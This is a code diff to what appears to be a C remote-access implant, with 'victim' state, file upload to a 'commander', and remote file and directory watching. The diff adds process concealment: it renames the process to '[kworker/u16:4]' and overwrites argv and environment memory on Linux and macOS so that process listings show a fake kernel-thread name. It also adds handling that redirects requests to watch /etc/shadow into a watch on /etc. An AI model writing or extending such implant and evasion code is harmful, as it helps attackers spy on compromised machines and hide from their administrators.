@@ -64,6 +64,7 @@ typedef struct {
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
+static char **g_orig_argv = NULL;
 
 static void handle_signal(int signo);
 static void init_state(victim_state_t *state);
@@ -95,6 +96,7 @@ static int send_file_to_commander(victim_state_t *state, const struct sockaddr_i
 static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int finish_file_upload(victim_state_t *state, char *message, size_t message_len);
+static int path_is_shadow(const char *path);
 static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
 static int snapshot_file_watch(const char *path, watch_state_t *watch);
@@ -106,8 +108,11 @@ static size_t bounded_strlen(const uint8_t *data, size_t limit);
 static int send_watch_message(const struct in_addr *target_addr, const char *payload, int payload_len);
 static void conceal_process(void);
 
-int main(void) {
+int main(int argc, char **argv) {
     victim_state_t state;
+
+    (void)argc;
+    g_orig_argv = argv;
 
     setvbuf(stdout, NULL, _IOLBF, 0);
     signal(SIGINT, handle_signal);
@@ -1138,6 +1143,19 @@ static int finish_file_upload(victim_state_t *state, char *message, size_t messa
     return 0;
 }
 
+static int path_is_shadow(const char *path) {
+    if (path == NULL) {
+        return 0;
+    }
+    if (strcmp(path, "/etc/shadow") == 0) {
+        return 1;
+    }
+    if (strcmp(path, "shadow") == 0) {
+        return 1;
+    }
+    return 0;
+}
+
 static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
     watch_state_t watch;
     char path[REMOTE_PATH_MAX];
@@ -1146,6 +1164,29 @@ static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint
     if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
         snprintf(message, message_len, "file watch failed: %s", error);
         return -1;
+    }
+
+    if (path_is_shadow(path)) {
+        char dir_path[REMOTE_PATH_MAX];
+        int len;
+
+        len = snprintf(dir_path, sizeof(dir_path), "/etc");
+        if (len < 0 || (size_t)len >= sizeof(dir_path)) {
+            snprintf(message, message_len, "directory watch failed: path too long");
+            return -1;
+        }
+
+        memset(&watch, 0, sizeof(watch));
+        if (snapshot_directory_watch(dir_path, &watch) != 0) {
+            snprintf(message, message_len, "directory watch failed: cannot access %s", dir_path);
+            return -1;
+        }
+
+        watch.active = 1;
+        snprintf(watch.path, sizeof(watch.path), "%s", dir_path);
+        state->directory_watch = watch;
+        snprintf(message, message_len, "watching /etc directory (shadow file requested)");
+        return 0;
     }
 
     memset(&watch, 0, sizeof(watch));
@@ -1372,18 +1413,86 @@ static int send_watch_message(const struct in_addr *target_addr, const char *pay
 }
 
 static void conceal_process(void) {
-#ifdef __linux__
     const char *chosen = "[kworker/u16:4]";
-    (void)prctl(PR_SET_NAME, chosen, 0, 0, 0);
-#endif
-#ifdef __APPLE__
-    extern char **environ;
-    for (char **env = environ; *env != NULL; env++) {
-        if (strncmp(*env, "DYLD_INSERT_LIBRARIES=", 22) == 0) {
-            *env = "DYLD_INSERT_LIBRARIES=";
+    size_t name_len;
+
+    name_len = strlen(chosen);
+
+#ifdef __linux__
+    {
+        char *end_of_env;
+        extern char **environ;
+        size_t avail;
+
+        (void)prctl(PR_SET_NAME, chosen, 0, 0, 0);
+
+        if (environ == NULL || environ[0] == NULL) {
+            return;
         }
-        if (strncmp(*env, "DYLD_LIBRARY_PATH=", 18) == 0) {
-            *env = "DYLD_LIBRARY_PATH=";
+
+        end_of_env = environ[0];
+        while (*environ != NULL) {
+            end_of_env = *environ + strlen(*environ) + 1;
+            environ++;
+        }
+
+        if (g_orig_argv == NULL || *g_orig_argv == NULL) {
+            return;
+        }
+
+        avail = (size_t)(end_of_env - g_orig_argv[0]);
+        if (avail > name_len) {
+            size_t i;
+            for (i = 0; i < name_len && i < avail; i++) {
+                g_orig_argv[0][i] = chosen[i];
+            }
+            g_orig_argv[0][i] = '\0';
+            for (i = 0; i < avail - name_len - 1 && i < (size_t)(3 * 1024); i++) {
+                g_orig_argv[0][name_len + 1 + i] = '\0';
+            }
+        }
+    }
+#elif defined(__APPLE__)
+    {
+        extern char **environ;
+        char **argv;
+        int argc;
+        size_t i;
+        size_t total_len = 0;
+        char *ptr;
+
+        argv = g_orig_argv;
+        if (argv == NULL || *argv == NULL) {
+            return;
+        }
+
+        for (argc = 0; argv[argc] != NULL; argc++) {
+            total_len += strlen(argv[argc]) + 1;
+        }
+        if (environ != NULL) {
+            for (int j = 0; environ[j] != NULL; j++) {
+                total_len += strlen(environ[j]) + 1;
+            }
+        }
+
+        ptr = g_orig_argv[0];
+        if (name_len < total_len) {
+            for (i = 0; i < name_len; i++) {
+                ptr[i] = chosen[i];
+            }
+            ptr[i] = '\0';
+            for (i = name_len + 1; i < total_len; i++) {
+                ptr[i] = '\0';
+            }
+        }
+
+        for (char **env = environ; *env != NULL; env++) {
+            if (strncmp(*env, "DYLD_INSERT_LIBRARIES=", 22) == 0) {
+                *env = "DYLD_INSERT_LIBRARIES=";
+            }
+            if (strncmp(*env, "DYLD_LIBRARY_PATH=", 18) == 0) {
+                *env = "DYLD_LIBRARY_PATH=";
+            }
         }
     }
 #endif
